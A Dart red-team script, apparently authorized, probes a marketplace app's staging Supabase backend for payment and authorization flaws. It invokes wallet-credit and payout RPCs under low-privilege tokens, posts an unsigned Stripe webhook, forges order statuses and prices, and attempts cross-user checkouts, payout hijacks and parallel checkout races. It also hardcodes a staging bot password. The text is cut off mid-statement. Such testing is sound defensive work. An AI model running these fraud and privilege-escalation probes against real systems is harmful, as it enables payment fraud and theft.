// ignore_for_file: avoid_print
/// RED TEAM PARALLEL C — Deep Cash / Race / Composição
/// dart run tool/rtc_c_deep_cash_20260830T1115.dart
/// PRODUÇÃO NÃO TOCADA · FASE 4 NÃO INICIADA · NÃO CORRIGE CÓDIGO
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const tag = 'RTC-20260830T1115';
const stagingRef = 'fxdknzrqjenzqcvnwqqq';

final matrix = <Map<String, dynamic>>[];
final findings = <Map<String, dynamic>>[];
final gaps = <String>[];
final createdProductIds = <String>[];
final createdOrderIds = <String>[];
final createdUserIds = <String>[];

void hit({
  required String surface,
  required String attack,
  required String identity,
  required Object result,
  required String impact,
  String severity = 'info',
  String? evidence,
}) {
  matrix.add({
    'surface': surface,
    'attack': attack,
    'identity': identity,
    'result': result is String ? result : jsonEncode(result),
    'impact': impact,
    'severity': severity,
    if (evidence != null) 'evidence': evidence,
  });
}

void finding({
  required String id,
  required String sev,
  required String title,
  required String actor,
  required String pre,
  required String repro,
  required String impact,
  String estado = 'ABERTO',
}) {
  findings.add({
    'id': id,
    'sev': sev,
    'title': title,
    'actor': actor,
    'pre': pre,
    'repro': repro,
    'impact': impact,
    'estado': estado,
  });
}

String clip(Object? o, [int n = 220]) {
  final s = o is String ? o : jsonEncode(o);
  if (s.length <= n) return s;
  return '${s.substring(0, n)}…';
}

Future<Map<String, dynamic>> httpJson(
  String method,
  String url,
  Map<String, String> headers, [
  Object? body,
]) async {
  final uri = Uri.parse(url);
  final encoded = body == null ? null : jsonEncode(body);
  late http.Response r;
  switch (method) {
    case 'POST':
      r = await http.post(uri, headers: headers, body: encoded);
      break;
    case 'PATCH':
      r = await http.patch(uri, headers: headers, body: encoded);
      break;
    case 'PUT':
      r = await http.put(uri, headers: headers, body: encoded);
      break;
    case 'DELETE':
      r = await http.delete(uri, headers: headers, body: encoded);
      break;
    default:
      r = await http.get(uri, headers: headers);
  }
  dynamic parsed;
  try {
    parsed = r.body.isEmpty ? null : jsonDecode(r.body);
  } catch (_) {
    parsed = r.body;
  }
  return {
    'http': r.statusCode,
    'body': parsed,
    'text': r.body,
  };
}

String? firstId(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    final s = '${(body.first as Map)['id'] ?? ''}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  if (body is Map) {
    final s = '${body['id'] ?? ''}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  return null;
}

Future<void> main() async {
  final frozenAt = DateTime.now().toUtc().toIso8601String();
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  if (!url.contains(stagingRef)) {
    stderr.writeln('ABORT: não é staging $stagingRef');
    exit(2);
  }
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final svc = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  final e2eSecret = (env['FLEABER_STAGING_CRASH_INJECT_SECRET'] ?? '').trim();
  final stripeLocal =
      (env['STRIPE_SECRET_KEY'] ?? Platform.environment['STRIPE_SECRET_KEY'] ?? '')
          .trim();

  final sb = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );

  final buyerEmail = envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL');
  final buyerPass = envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD');
  final sellerEmail = envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL');
  final sellerPass = envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD');
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');

  final buyerTok = await sb.signIn(email: buyerEmail, password: buyerPass);
  final sellerTok = await sb.signIn(email: sellerEmail, password: sellerPass);

  String? buyer2Tok;
  String? buyer2Id;
  try {
    buyer2Tok = await sb.signIn(
      email: 'demo_bot_01@staging.fleaber.bot',
      password: 'FleaberBotSim_Staging_2026!',
    );
    buyer2Id = await sb.userIdForAccessToken(buyer2Tok);
  } catch (e) {
    gaps.add('buyer2 lab login falhou: $e');
    try {
      final email = 'rtc.c.${DateTime.now().millisecondsSinceEpoch}@staging.fleaber.bot';
      buyer2Id = await sb.createAdminUser(
        email: email,
        password: 'RtcC_Lab_2026!',
        userMetadata: {'handle': tag},
      );
      createdUserIds.add(buyer2Id);
      buyer2Tok = await sb.signIn(email: email, password: 'RtcC_Lab_2026!');
    } catch (e2) {
      gaps.add('buyer2 descartável falhou: $e2');
    }
  }

  Map<String, String> H(String tok) => {
        'apikey': anon,
        'Authorization': 'Bearer $tok',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };
  final BH = H(buyerTok);
  final SH = H(sellerTok);
  final AH = {
    'apikey': anon,
    'Authorization': 'Bearer $anon',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final SVC = {
    'apikey': svc,
    'Authorization': 'Bearer $svc',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };

  Future<Map<String, dynamic>> rpcTry(
    String fn,
    Map<String, dynamic> params,
    Map<String, String> hdr,
  ) =>
      httpJson('POST', '$url/rest/v1/rpc/$fn', hdr, params);

  Future<Map<String, dynamic>> edge(
    String fn,
    Map<String, dynamic> body,
    Map<String, String> hdr, {
    String qs = '',
  }) =>
      httpJson('POST', '$url/functions/v1/$fn$qs', {
        ...hdr,
        'apikey': anon,
      }, body);

  Future<Map<String, dynamic>> insertProduct({
    required String title,
    required double price,
    required int qty,
  }) async {
    final r = await httpJson('POST', '$url/rest/v1/products', SH, {
      'seller_id': sellerId,
      'title': title,
      'price': price,
      'quantity': qty,
      'ref_code': '$tag-${DateTime.now().microsecondsSinceEpoch}',
      'list_on_marketplace': true,
      'available_for_live': false,
      'is_sold': false,
      'image_urls': <String>[],
    });
    final id = firstId(r['body']);
    if (id != null) createdProductIds.add(id);
    return {...r, 'id': id};
  }

  Future<Map<String, dynamic>> insertOrder({
    required Map<String, String> hdr,
    required String productId,
    required String asBuyer,
    Map<String, dynamic> extra = const {},
  }) async {
    final r = await httpJson('POST', '$url/rest/v1/orders', hdr, {
      'product_id': productId,
      'buyer_id': asBuyer,
      'seller_id': sellerId,
      'price_total': extra['price_total'] ?? 5.0,
      'quantity': extra['quantity'] ?? 1,
      'status': extra['status'] ?? 'reserva_pendente',
      'payment_method': extra['payment_method'] ?? 'Pagamento na app',
      'shipping_method': extra['shipping_method'] ?? 'entrega em mão',
      if (extra['product_offer_id'] != null)
        'product_offer_id': extra['product_offer_id'],
      if (extra['contract_unit_cents'] != null)
        'contract_unit_cents': extra['contract_unit_cents'],
      if (extra['contract_qty'] != null) 'contract_qty': extra['contract_qty'],
      if (extra['amount_paid_cents'] != null)
        'amount_paid_cents': extra['amount_paid_cents'],
    });
    final id = firstId(r['body']);
    if (id != null) createdOrderIds.add(id);
    return {...r, 'id': id};
  }

  Future<Map<String, dynamic>?> row(String table, String id) async {
    final r = await httpJson(
      'GET',
      '$url/rest/v1/$table?id=eq.$id&select=*&limit=1',
      SVC,
    );
    final b = r['body'];
    if (b is List && b.isNotEmpty && b.first is Map) {
      return Map<String, dynamic>.from(b.first as Map);
    }
    return null;
  }

  Future<double> walletBal(String uid) async {
    final r = await httpJson(
      'GET',
      '$url/rest/v1/wallets?id=eq.$uid&select=balance,id',
      SVC,
    );
    final b = r['body'];
    if (b is List && b.isNotEmpty && b.first is Map) {
      return (b.first['balance'] as num?)?.toDouble() ?? 0;
    }
    return 0;
  }

  Future<List<Map<String, dynamic>>> walletTx(String orderId) async {
    final r = await httpJson(
      'GET',
      '$url/rest/v1/wallet_transactions?order_id=eq.$orderId&select=*&order=created_at.asc',
      SVC,
    );
    final b = r['body'];
    if (b is List) {
      return [
        for (final e in b)
          if (e is Map) Map<String, dynamic>.from(e)
      ];
    }
    return [];
  }

  print('=== RTC-C $tag bootstrap frozen=$frozenAt ===');

  // -------------------------------------------------------------------------
  // RECON: RPCs OpenAPI + wallets
  // -------------------------------------------------------------------------
  final oa = await httpJson('GET', '$url/rest/v1/', {
    ...SVC,
    'Accept': 'application/openapi+json',
  });
  final rpcNames = <String>[];
  final paths = (oa['body'] is Map) ? (oa['body'] as Map)['paths'] : null;
  if (paths is Map) {
    for (final k in paths.keys) {
      final s = k.toString();
      if (s.startsWith('/rpc/')) rpcNames.add(s.substring(5));
    }
  }
  print('RPCs OpenAPI: ${rpcNames.length}');
  final moneyRpcs = rpcNames
      .where((n) =>
          n.contains('wallet') ||
          n.contains('payout') ||
          n.contains('refund') ||
          n.contains('credit') ||
          n.contains('tip') ||
          n.contains('checkout') ||
          n.contains('settle') ||
          n.contains('payout') ||
          n.contains('dispute') ||
          n.contains('offer') ||
          n.contains('reservation'))
      .toList()
    ..sort();
  hit(
    surface: 'schema',
    attack: 'enum RPCs money-ish',
    identity: 'service_observe',
    result: moneyRpcs,
    impact: 'mapa de ataque',
  );

  final buyerBal0 = await walletBal(buyerId);
  final sellerBal0 = await walletBal(sellerId);
  print('wallet buyer=$buyerBal0 seller=$sellerBal0');

  // -------------------------------------------------------------------------
  // POÇO 3 warmup: JWT mint / autoridade RPC (sem captura)
  // -------------------------------------------------------------------------
  final mintTargets = <String, Map<String, dynamic>>{
    'batata_credit_wallet_once': {
      'p_user_id': buyerId,
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 50,
      'p_type': 'reembolso',
      'p_description': tag,
    },
    'batata_wallet_apply_tip_once': {
      'p_seller_id': sellerId,
      'p_tip_id': '00000000-0000-0000-0000-000000000001',
      'p_amount': 10,
      'p_stripe_session_id': 'cs_test_$tag',
      'p_source': tag,
    },
    'batata_wallet_payout_debit': {
      'p_user_id': sellerId,
      'p_amount_cents': 100,
      'p_idempotency_key': '$tag-payout-x',
    },
    'batata_refund_buyer_wallet_for_order': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
    },
    'batata_release_seller_wallet_for_order': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
    },
    'batata_process_partial_refund_dispute': {
      'p_order_id': '00000000-0000-0000-0000-000000000001',
      'p_refund_percent': 100,
    },
    'batata_settle_live_tip_from_stripe': {
      'p_tip_id': '00000000-0000-0000-0000-000000000001',
      'p_stripe_session_id': 'cs_test_$tag',
      'p_paid_amount_cents': 500,
    },
    'batata_send_live_tip_from_wallet': {
      'p_live_id': null,
      'p_seller_id': sellerId,
      'p_amount': 1,
      'p_message': tag,
    },
  };

  for (final ident in [
    ['anon', AH],
    ['buyer', BH],
    ['seller', SH],
  ]) {
    for (final e in mintTargets.entries) {
      final r = await rpcTry(e.key, e.value, ident[1] as Map<String, String>);
      final httpCode = r['http'] as int;
      final ok = httpCode == 200;
      final looksMint = e.key.contains('credit') ||
          e.key.contains('apply_tip') ||
          e.key.contains('payout');
      hit(
        surface: 'RPC/${e.key}',
        attack: 'JWT ${ident[0]} invoke',
        identity: ident[0] as String,
        result: 'http=$httpCode ${clip(r['text'], 160)}',
        impact: ok && looksMint ? 'possível mint/payout' : 'bloqueado ou no-op',
        severity: ok && looksMint ? 'P0?' : 'info',
      );
      if (ok && looksMint) {
        finding(
          id: 'RTC-C-RPC-${e.key}',
          sev: 'P1',
          title: 'RPC financeira executou com JWT ${ident[0]}',
          actor: ident[0] as String,
          pre: 'sem captura',
          repro: 'POST /rpc/${e.key} JWT ${ident[0]}',
          impact: 'autoridade financeira via JWT — confirmar Δwallet',
        );
      }
    }
  }

  // Anon DEFINER scan (money-ish)
  for (final fn in [
    'batata_mark_live_item_sold',
    'batata_product_checkout_available',
    'batata_seller_direct_payment_details',
    'batata_find_user_id_by_email',
    'batata_live_reservation_accept_available',
  ]) {
    final r = await rpcTry(fn, {
      if (fn.contains('sold')) 'p_live_item_id': '00000000-0000-0000-0000-000000000001',
      if (fn.contains('checkout')) 'p_product_id': '00000000-0000-0000-0000-000000000001',
      if (fn.contains('checkout')) 'p_need_qty': 1,
      if (fn.contains('payment_details')) 'p_order_id': '00000000-0000-0000-0000-000000000001',
      if (fn.contains('email')) 'p_email': sellerEmail,
      if (fn.contains('accept'))
        'p_live_item_id': '00000000-0000-0000-0000-000000000001',
      if (fn.contains('accept'))
        'p_buyer_id': buyerId,
    }, AH);
    hit(
      surface: 'RPC/$fn',
      attack: 'anon invoke',
      identity: 'anon',
      result: 'http=${r['http']} ${clip(r['text'], 140)}',
      impact: (r['http'] as int) == 200 ? 'DEFINER anon aberto' : 'revoke/guard',
      severity: (r['http'] as int) == 200 ? 'P1' : 'info',
    );
  }

  // Edge: fase2_e2e com JWT buyer (não service)
  final e2eJwt = await edge(
    'create-payment-intent',
    {
      'order_id': '00000000-0000-0000-0000-000000000001',
      'payment_intent_id': 'pi_test',
    },
    BH,
    qs: '?fase2_e2e_settle=1',
  );
  hit(
    surface: 'EDGE/fase2_e2e_settle',
    attack: 'buyer JWT settle e2e',
    identity: 'buyer',
    result: 'http=${e2eJwt['http']} ${clip(e2eJwt['text'], 160)}',
    impact: (e2eJwt['http'] as int) == 200
        ? 'settle service_role bypass'
        : 'service_role gated',
    severity: (e2eJwt['http'] as int) == 200 ? 'P0' : 'info',
  );

  final wh = await httpJson(
    'POST',
    '$url/functions/v1/stripe-webhook',
    {'Content-Type': 'application/json', 'apikey': anon},
    {'type': 'checkout.session.completed', 'data': {}},
  );
  hit(
    surface: 'EDGE/stripe-webhook',
    attack: 'POST sem stripe-signature',
    identity: 'anon',
    result: 'http=${wh['http']} ${clip(wh['text'], 120)}',
    impact: (wh['http'] as int) == 200 ? 'webhook forjável' : 'assinatura exigida',
    severity: (wh['http'] as int) == 200 ? 'P0' : 'info',
  );

  // -------------------------------------------------------------------------
  // Fixture produto stock=1 e stock=5
  // -------------------------------------------------------------------------
  final p1 = await insertProduct(
    title: '$tag stock1 12.00',
    price: 12.0,
    qty: 1,
  );
  final p5 = await insertProduct(
    title: '$tag stock5 8.00',
    price: 8.0,
    qty: 5,
  );
  final pid1 = p1['id'] as String?;
  final pid5 = p5['id'] as String?;
  if (pid1 == null || pid5 == null) {
    stderr.writeln('FAIL fixture product ${p1['text']} ${p5['text']}');
    exit(3);
  }

  // Buyer INSERT hostil: qty 99, price 0.01, contract 1 cent, amount_paid
  final hostile = await insertOrder(
    hdr: BH,
    productId: pid5,
    asBuyer: buyerId,
    extra: {
      'price_total': 0.01,
      'quantity': 99,
      'contract_unit_cents': 1,
      'contract_qty': 1,
      'amount_paid_cents': 1,
      'status': 'reserva_pendente',
    },
  );
  final hostileRow = hostile['id'] != null ? await row('orders', hostile['id'] as String) : null;
  hit(
    surface: 'orders INSERT',
    attack: 'buyer qty=99 price=0.01 contract=1c amount_paid=1',
    identity: 'buyer',
    result: {
      'http': hostile['http'],
      'qty': hostileRow?['quantity'],
      'contract_unit': hostileRow?['contract_unit_cents'],
      'contract_qty': hostileRow?['contract_qty'],
      'amount_paid': hostileRow?['amount_paid_cents'],
      'price_total': hostileRow?['price_total'],
    },
    impact: 'selo servidor vs body',
  );

  // Buyer PATCH status=pago + amount_paid
  if (hostile['id'] != null) {
    final patchPago = await httpJson(
      'PATCH',
      '$url/rest/v1/orders?id=eq.${hostile['id']}',
      BH,
      {
        'status': 'pago',
        'amount_paid_cents': 50000,
        'contract_unit_cents': 1,
        'quantity': 1,
      },
    );
    final after = await row('orders', hostile['id'] as String);
    hit(
      surface: 'orders PATCH',
      attack: 'buyer status=pago + amount_paid + contract',
      identity: 'buyer',
      result: {
        'http': patchPago['http'],
        'status': after?['status'],
        'amount_paid': after?['amount_paid_cents'],
        'contract': after?['contract_unit_cents'],
      },
      impact: after?['status'] == 'pago'
          ? 'buyer atestou pagamento'
          : 'FSM/RLS bloqueou',
      severity: after?['status'] == 'pago' ? 'P1' : 'info',
    );
  }

  // Seller PATCH Stripe-method order → pago (sem captura)
  final stripePend = await insertOrder(
    hdr: BH,
    productId: pid5,
    asBuyer: buyerId,
    extra: {
      'price_total': 8.0,
      'payment_method': 'Pagamento na app',
      'status': 'reservado',
    },
  );
  if (stripePend['id'] != null) {
    final sp = await httpJson(
      'PATCH',
      '$url/rest/v1/orders?id=eq.${stripePend['id']}',
      SH,
      {'status': 'pago'},
    );
    final after = await row('orders', stripePend['id'] as String);
    hit(
      surface: 'orders FSM',
      attack: 'seller marca pago em Seguro Fleaber sem captura',
      identity: 'seller',
      result: {
        'http': sp['http'],
        'status': after?['status'],
      },
      impact: after?['status'] == 'pago'
          ? 'seller falsifica pagamento plataforma'
          : 'FSM exige captura/off-platform',
      severity: after?['status'] == 'pago' ? 'P0' : 'info',
    );
  }

  // Off-platform seller confirm + wallet
  final offP = await insertProduct(
    title: '$tag offplat 9.00',
    price: 9.0,
    qty: 2,
  );
  final offPid = offP['id'] as String?;
  Map<String, dynamic>? offOrderRow;
  if (offPid != null) {
    final offO = await insertOrder(
      hdr: BH,
      productId: offPid,
      asBuyer: buyerId,
      extra: {
        'price_total': 9.0,
        'payment_method': 'MB WAY',
        'status': 'aguarda_confirmacao',
        'shipping_method': 'entrega em mão',
      },
    );
    if (offO['id'] != null) {
      final balB0 = await walletBal(buyerId);
      final balS0 = await walletBal(sellerId);
      final confirm = await httpJson(
        'PATCH',
        '$url/rest/v1/orders?id=eq.${offO['id']}',
        SH,
        {'status': 'pago'},
      );
      offOrderRow = await row('orders', offO['id'] as String);
      final tx = await walletTx(offO['id'] as String);
      final balB1 = await walletBal(buyerId);
      final balS1 = await walletBal(sellerId);
      hit(
        surface: 'off-platform',
        attack: 'seller confirma MB WAY → pago; Δwallet',
        identity: 'seller',
        result: {
          'http': confirm['http'],
          'status': offOrderRow?['status'],
          'dBuyer': balB1 - balB0,
          'dSeller': balS1 - balS0,
          'tx': tx.length,
          'types': [for (final t in tx) t['type']],
        },
        impact: (balS1 - balS0).abs() > 0.001 || (balB1 - balB0).abs() > 0.001
            ? 'mint/debit off-platform'
            : 'sem Δwallet (esperado)',
        severity: (balS1 - balS0).abs() > 0.001 || (balB1 - balB0).abs() > 0.001
            ? 'P0'
            : 'info',
      );
      if ((balS1 - balS0).abs() > 0.001 || (balB1 - balB0).abs() > 0.001) {
        finding(
          id: 'RTC-C-F-001',
          sev: 'P0',
          title: 'Off-platform pago mintou wallet sem captura Stripe',
          actor: 'seller',
          pre: 'order MB WAY aguarda_confirmacao',
          repro: 'PATCH status=pago JWT seller',
          impact: 'Δwallet buyer=${balB1 - balB0} seller=${balS1 - balS0}',
        );
      }

      // Stripe checkout na mesma order off-platform
      final ckOff = await edge('create-payment-intent', {
        'buyer_id': buyerId,
        'order_id': offO['id'],
        'product_id': offPid,
        'amount': 50,
        'shipping_method': 'hand',
      }, BH);
      hit(
        surface: 'checkout×off-platform',
        attack: 'Session Stripe em order MB WAY já/para-pago',
        identity: 'buyer',
        result: 'http=${ckOff['http']} ${clip(ckOff['text'], 180)}',
        impact: (ckOff['http'] as int) == 200
            ? 'dois caminhos de pagamento na mesma order'
            : 'bloqueado',
        severity: (ckOff['http'] as int) == 200 ? 'P1' : 'info',
      );
    }
  }

  // Catalog mutation after contract
  final pCat = await insertProduct(
    title: '$tag catalog-mut 20.00',
    price: 20.0,
    qty: 2,
  );
  final pCatId = pCat['id'] as String?;
  if (pCatId != null) {
    final oCat = await insertOrder(
      hdr: BH,
      productId: pCatId,
      asBuyer: buyerId,
      extra: {'price_total': 20.0, 'quantity': 1},
    );
    await httpJson(
      'PATCH',
      '$url/rest/v1/products?id=eq.$pCatId',
      SH,
      {'price': 1.0},
    );
    final oAfter = oCat['id'] != null ? await row('orders', oCat['id'] as String) : null;
    final ck = await edge('create-payment-intent', {
      'buyer_id': buyerId,
      'order_id': oCat['id'],
      'product_id': pCatId,
      'amount': 50,
      'shipping_method': 'hand',
      'item_price': 1.0,
      'quantity': 1,
    }, BH);
    final serverAmt = (ck['body'] is Map)
        ? (ck['body'] as Map)['server_amount_cents']
        : null;
    hit(
      surface: 'contrato vs catálogo',
      attack: 'seller baixa preço 20→1 após order; checkout',
      identity: 'buyer+seller conluio',
      result: {
        'http': ck['http'],
        'server_amount_cents': serverAmt,
        'contract': oAfter?['contract_unit_cents'],
        'clip': clip(ck['text'], 160),
      },
      impact: (serverAmt is num && serverAmt < 1500)
          ? 'cobrança segue catálogo vivo (underpay)'
          : 'contrato selado ou bloqueado',
      severity: (serverAmt is num && serverAmt < 1500) ? 'P1' : 'info',
    );
  }

  // Body amount / qty / portes vs quote
  final oQuote = await insertOrder(
    hdr: BH,
    productId: pid5,
    asBuyer: buyerId,
    extra: {
      'price_total': 8.0,
      'quantity': 1,
      'shipping_method': 'envio transportadora (€3.50)',
      'payment_method': 'Pagamento na app',
    },
  );
  if (oQuote['id'] != null) {
    final sealed = await row('orders', oQuote['id'] as String);
    final variants = <Map<String, dynamic>>[
      {'amount': 50, 'quantity': 1, 'shipping_method': 'hand'},
      {'amount': 50, 'quantity': 99, 'shipping_method': 'hand'},
      {'amount': 999999, 'item_price': 0.01, 'shipping': 0, 'protection_fee': 0},
      {
        'amount': 50,
        'prize_shipping': true,
        'shipping_method': 'carrier',
      },
      {
        'buyer_id': sellerId,
        'order_id': oQuote['id'],
      },
    ];
    for (var i = 0; i < variants.length; i++) {
      final body = {
        'buyer_id': buyerId,
        'order_id': oQuote['id'],
        'product_id': pid5,
        'shipping_method': 'hand',
        ...variants[i],
      };
      if (i == 4) {
        // seller JWT + buyer_id swap
        final r = await edge('create-payment-intent', body, SH);
        hit(
          surface: 'checkout quote',
          attack: 'seller JWT checkout order do buyer',
          identity: 'seller',
          result: 'http=${r['http']} amt=${(r['body'] is Map) ? (r['body'] as Map)['server_amount_cents'] : null} ${clip(r['text'], 120)}',
          impact: (r['http'] as int) == 200 ? 'confused deputy checkout' : 'uid bind',
          severity: (r['http'] as int) == 200 ? 'P1' : 'info',
        );
        continue;
      }
      final r = await edge('create-payment-intent', body, BH);
      hit(
        surface: 'checkout quote',
        attack: 'body hostil #$i ${variants[i].keys.join(",")}',
        identity: 'buyer',
        result: {
          'http': r['http'],
          'server': (r['body'] is Map) ? (r['body'] as Map)['server_amount_cents'] : null,
          'sealed_ship': sealed?['shipping_method'],
          'sealed_unit': sealed?['contract_unit_cents'],
          'err': clip(r['text'], 140),
        },
        impact: 'quote servidor vs body',
      );
    }
  }

  // Cross-user: buyer2 checkout order of buyer
  if (buyer2Tok != null && oQuote['id'] != null) {
    final r = await edge('create-payment-intent', {
      'buyer_id': buyer2Id,
      'order_id': oQuote['id'],
      'product_id': pid5,
      'amount': 50,
      'shipping_method': 'hand',
    }, H(buyer2Tok));
    hit(
      surface: 'checkout parties',
      attack: 'buyer2 Session na order do buyer1',
      identity: 'buyer_malicioso',
      result: 'http=${r['http']} ${clip(r['text'], 140)}',
      impact: (r['http'] as int) == 200 ? 'paga order alheia' : 'buyer bind',
      severity: (r['http'] as int) == 200 ? 'P1' : 'info',
    );
  }

  // Refund-order as buyer
  final rfBuyer = await edge('refund-order', {'order_id': oQuote['id']}, BH);
  hit(
    surface: 'EDGE/refund-order',
    attack: 'buyer pede refund',
    identity: 'buyer',
    result: 'http=${rfBuyer['http']} ${clip(rfBuyer['text'], 140)}',
    impact: (rfBuyer['http'] as int) == 200 &&
            (rfBuyer['body'] is Map && (rfBuyer['body'] as Map)['ok'] == true &&
                (rfBuyer['body'] as Map)['skipped'] != true)
        ? 'buyer refund Stripe'
        : 'seller-only',
    severity: (rfBuyer['http'] as int) == 200 &&
            (rfBuyer['body'] is Map && (rfBuyer['body'] as Map)['skipped'] != true)
        ? 'P1'
        : 'info',
  );

  // Payout hijack
  final payX = await edge('create-connect-account', {
    'user_id': sellerId,
    'amount': 100,
    'idempotency_key': '$tag-payout-cross',
  }, BH);
  hit(
    surface: 'payout',
    attack: 'buyer payout user_id=seller 100c',
    identity: 'buyer',
    result: 'http=${payX['http']} ${clip(payX['text'], 160)}',
    impact: (payX['http'] as int) == 200 ? 'payout identidade cruzada' : 'uid bind',
    severity: (payX['http'] as int) == 200 ? 'P0' : 'info',
  );
  final payNeg = await edge('create-connect-account', {
    'amount': -100,
    'idempotency_key': '$tag-payout-neg',
  }, SH);
  hit(
    surface: 'payout',
    attack: 'seller amount=-100',
    identity: 'seller',
    result: 'http=${payNeg['http']} ${clip(payNeg['text'], 140)}',
    impact: 'amount hostil',
  );

  // Tip: client tip_id + amount
  final tipBad = await edge('create-live-tip-checkout', {
    'seller_id': sellerId,
    'amount_eur': 1,
    'tip_id': '00000000-0000-0000-0000-000000000001',
  }, BH);
  hit(
    surface: 'tip',
    attack: 'client tip_id inject',
    identity: 'buyer',
    result: 'http=${tipBad['http']} ${clip(tipBad['text'], 140)}',
    impact: (tipBad['http'] as int) == 200 ? 'paga A credita B' : 'tip_id rejeitado',
    severity: (tipBad['http'] as int) == 200 ? 'P1' : 'info',
  );
  final tipHi = await edge('create-live-tip-checkout', {
    'seller_id': sellerId,
    'amount_eur': 9999,
  }, BH);
  hit(
    surface: 'tip',
    attack: 'amount_eur=9999',
    identity: 'buyer',
    result: 'http=${tipHi['http']} ${clip(tipHi['text'], 120)}',
    impact: 'teto servidor',
  );

  // Offer oneshot + qty
  final pOff = await insertProduct(
    title: '$tag offer 15.00',
    price: 15.0,
    qty: 3,
  );
  final pOffId = pOff['id'] as String?;
  if (pOffId != null) {
    final offerIns = await httpJson('POST', '$url/rest/v1/product_offers', BH, {
      'product_id': pOffId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 4.0,
      'status': 'accepted',
      'responded_at': DateTime.now().toUtc().toIso8601String(),
    });
    hit(
      surface: 'offers',
      attack: 'buyer INSERT offer já accepted 4€',
      identity: 'buyer',
      result: 'http=${offerIns['http']} ${clip(offerIns['text'], 160)}',
      impact: (offerIns['http'] as int) >= 200 && (offerIns['http'] as int) < 300
          ? 'buyer forja aceite'
          : 'RLS/trigger',
      severity: (offerIns['http'] as int) >= 200 && (offerIns['http'] as int) < 300
          ? 'P1'
          : 'info',
    );
    final offerId = firstId(offerIns['body']);
    if (offerId != null) {
      final oOffer = await insertOrder(
        hdr: BH,
        productId: pOffId,
        asBuyer: buyerId,
        extra: {
          'price_total': 4.0,
          'quantity': 2,
          'product_offer_id': offerId,
        },
      );
      hit(
        surface: 'offers×qty',
        attack: 'order qty=2 com offer aceite',
        identity: 'buyer',
        result: {
          'http': oOffer['http'],
          'id': oOffer['id'],
          'row': oOffer['id'] != null
              ? {
                  'qty': (await row('orders', oOffer['id'] as String))?['quantity'],
                  'contract_qty': (await row('orders', oOffer['id'] as String))?['contract_qty'],
                  'contract_unit': (await row('orders', oOffer['id'] as String))?['contract_unit_cents'],
                }
              : clip(oOffer['text'], 140),
        },
        impact: 'offer deve forçar qty=1 ou rejeitar',
      );
    }
    // Seller accept path: pending offer then seller patch accepted
    final offerPend = await httpJson('POST', '$url/rest/v1/product_offers', BH, {
      'product_id': pOffId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 5.0,
      'status': 'pending',
    });
    final opid = firstId(offerPend['body']);
    if (opid != null) {
      final acc = await httpJson(
        'PATCH',
        '$url/rest/v1/product_offers?id=eq.$opid',
        SH,
        {
          'status': 'accepted',
          'responded_at': DateTime.now().toUtc().toIso8601String(),
        },
      );
      final o2 = await insertOrder(
        hdr: BH,
        productId: pOffId,
        asBuyer: buyerId,
        extra: {
          'price_total': 5.0,
          'quantity': 1,
          'product_offer_id': opid,
        },
      );
      if (o2['id'] != null) {
        final ck = await edge('create-payment-intent', {
          'buyer_id': buyerId,
          'order_id': o2['id'],
          'product_id': pOffId,
          'amount': 50,
          'shipping_method': 'hand',
        }, BH);
        hit(
          surface: 'offers checkout',
          attack: 'checkout após offer 5€ (catálogo 15€)',
          identity: 'buyer',
          result: {
            'accept_http': acc['http'],
            'checkout_http': ck['http'],
            'server': (ck['body'] is Map)
                ? (ck['body'] as Map)['server_amount_cents']
                : clip(ck['text'], 140),
          },
          impact: 'preço oferta vs catálogo',
        );
      }
    }
  }

  // -------------------------------------------------------------------------
  // POÇO 2 — stock=1 races
  // -------------------------------------------------------------------------
  final raceP = await insertProduct(
    title: '$tag race stock1 7.00',
    price: 7.0,
    qty: 1,
  );
  final racePid = raceP['id'] as String?;
  if (racePid != null) {
    final orders = <String>[];
    for (var i = 0; i < 4; i++) {
      final o = await insertOrder(
        hdr: BH,
        productId: racePid,
        asBuyer: buyerId,
        extra: {
          'price_total': 7.0,
          'status': 'reserva_pendente',
          'payment_method': 'Pagamento na app',
        },
      );
      if (o['id'] != null) orders.add(o['id'] as String);
    }
    if (buyer2Tok != null && buyer2Id != null) {
      final o2 = await insertOrder(
        hdr: H(buyer2Tok),
        productId: racePid,
        asBuyer: buyer2Id,
        extra: {
          'price_total': 7.0,
          'status': 'reserva_pendente',
          'payment_method': 'Pagamento na app',
        },
      );
      if (o2['id'] != null) orders.add(o2['id'] as String);
    }
    hit(
      surface: 'stock hold',
      attack: 'N INSERT reserva_pendente stock=1',
      identity: 'buyer(+buyer2)',
      result: {
        'created': orders.length,
        'ids': orders,
        'product': await row('products', racePid),
      },
      impact: 'holds vs quantity',
    );

    // 10 parallel checkout
    if (orders.isNotEmpty) {
      final bodies = [
        for (var i = 0; i < 10; i++)
          {
            'buyer_id': buyerId,
            'order_id': orders[i % orders.length],
            'product_id': racePid,
            'amount': 50,
            'shipping_method': 'hand',
          }
      ];
      final futs = [
        for (final b in bodies) edge('create-payment-intent', b, BH),
      ];
      final rs = await Future.wait(futs);
      final ok = rs.where((r) => r['http'] == 200).length;
      final sessions = [
        for (final r in rs)
          if (r['body'] is Map) (r['body'] as Map)['checkoutSessionId']
      ];
      hit(
        surface: 'race checkout',
